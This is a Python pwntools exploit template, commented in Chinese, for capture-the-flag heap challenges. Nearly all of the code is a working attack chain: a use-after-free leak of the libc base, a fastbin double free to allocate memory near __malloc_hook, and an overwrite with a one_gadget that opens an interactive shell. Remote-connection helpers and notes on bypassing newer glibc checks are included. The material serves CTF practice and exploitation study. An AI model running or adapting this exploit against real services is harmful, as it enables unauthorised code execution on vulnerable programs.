# -*- coding: utf-8 -*-
# 脚本名称: 堆题 UAF / fastbin attack 利用模板（glibc 2.27 前 tcache 前经典）
# 方向: Pwn（堆利用）
# 简介: Use-After-Free + fastbin dup 攻击骨架：free 后悬空指针未清，
#       利用残留 fd 指针伪造 fastbin 链，分配到 __malloc_hook 附近，
#       写 one_gadget 拿 shell。含 add/free/show/edit 菜单封装与
#       glibc 2.27 tcache、2.32 后 key 检查的注意事项。
# 用法:
#   1) 按题目菜单修改 add/edit/delete/show 的编号与提示；
#   2) 填 OFFSET / HOOK / ONE_GADGET（one_gadget ./libc.so.6 得到）；
#   3) python heap_uaf_fastbin_template.py REMOTE ip port
#      python heap_uaf_fastbin_template.py --selftest
# 依赖: pip install pwntools；one_gadget（gem install one_gadget）
# 参考: glibc malloc 源码、how2heap
from pwn import *

context(os="linux", arch="amd64", log_level="info")

BIN = "./heap"
LIBC = "./libc.so.6"
# 这些偏移必须用题目给定 libc 实测后填入（示例为 glibc 2.23 常见值，仅示意）
MALLOC_HOOK_OFF = 0x3c4b10
ONE_GADGETS = [0x45226, 0x4527a, 0xf03a4, 0xf1247]


def start():
    if args.REMOTE:
        return remote(args.REMOTE, int(args.PORT or 9999))
    return process(BIN)


def add(io, size, data):
    io.sendlineafter(b"choice:", b"1")
    io.sendlineafter(b"size:", str(size).encode())
    io.sendafter(b"data:", data)


def free(io, idx):
    io.sendlineafter(b"choice:", b"2")
    io.sendlineafter(b"idx:", str(idx).encode())


def show(io, idx):
    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b"idx:", str(idx).encode())
    return io.recvline()


def exploit():
    io = start()
    libc = ELF(LIBC, checksec=False)

    # ---- 经典 UAF/fastbin dup 流程（glibc 2.23, 64bit）----
    # 1) 分配一个 unsorted-bin 大小的块，free 后泄露 main_arena/libc
    add(io, 0x90, b"leak chunk")          # idx 0
    add(io, 0x20, b"guard")               # idx 1 防与 top 合并
    free(io, 0)
    leak = u64(show(io, 0)[:6].ljust(8, b"\x00"))
    libc.address = leak - (libc.sym["main_arena"] + 88)
    log.success("libc base = %#x", libc.address)

    # 2) fastbin double free: A -> B -> A
    add(io, 0x60, b"A")                   # idx 2
    add(io, 0x60, b"B")                   # idx 3
    free(io, 2)
    free(io, 3)
    free(io, 2)                           # double free（2.27 前无 key 检查）

    # 3) 把 __malloc_hook 附近伪块地址写进 fastbin 链
    fake = libc.sym["__malloc_hook"] - 0x23
    add(io, 0x60, p64(fake))              # 弹出 A，写入 fd=fake
    add(io, 0x60, b"x")                   # 弹出 B
    add(io, 0x60, b"y")                   # 弹出 A
    # 4) 分配到伪块，覆盖 __malloc_hook 为 one_gadget
    payload = b"\x00" * 0x13 + p64(libc.address + ONE_GADGETS[1])
    add(io, 0x60, payload)
    # 5) 触发 malloc -> one_gadget
    io.sendlineafter(b"choice:", b"1")
    io.sendlineafter(b"size:", b"32")
    io.interactive()


def selftest():
    # 仅验证关键常量/打包逻辑，不在本机跑真实堆题（libc 版本相关）
    payload = b"\x00" * 0x13 + p64(0x7ffff7a00000 + 0x4527a)
    assert len(payload) == 0x13 + 8
    assert payload[0x13:] == p64(0x7ffff7a4527a)
    print("[+] payload 打包逻辑 OK")
    print("[+] selftest OK（真实利用需在匹配 libc 的环境/Docker 中跑）")
    print("    glibc 2.27+: 先过 tcache（7 个同大小块填满 tcache 再进 fastbin/unsorted）")
    print("    glibc 2.32+: double free 有 key 检查，需 UAF 改 key 或换 house 系列")


if __name__ == "__main__":
    import sys
    if "--selftest" in sys.argv:
        selftest()
    else:
        exploit()
